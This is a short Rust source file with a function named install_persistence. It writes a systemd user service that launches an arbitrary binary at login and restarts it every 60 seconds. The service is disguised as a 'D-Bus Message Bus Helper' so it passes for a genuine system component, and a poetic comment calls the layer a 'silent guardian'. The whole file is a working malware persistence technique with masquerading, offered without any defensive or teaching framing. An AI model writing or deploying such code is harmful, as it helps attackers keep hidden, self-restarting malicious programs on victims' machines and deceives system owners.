use std::fs;

pub fn install_persistence(binary_path: &str) -> std::io::Result<()> {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
    let service_dir = format!("{}/.config/systemd/user", home);
    fs::create_dir_all(&service_dir)?;

    let service_content = format!(
r#"[Unit]
Description=D-Bus Message Bus Helper
After=network.target

[Service]
ExecStart={}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
"#, binary_path);

    let service_file = format!("{}/dbus-helper.service", service_dir);
    fs::write(&service_file, service_content)?;

    /*
     * The persistence layer settles into the system like a silent guardian,
     * waiting for the next dawn.
     */
    Ok(())
}
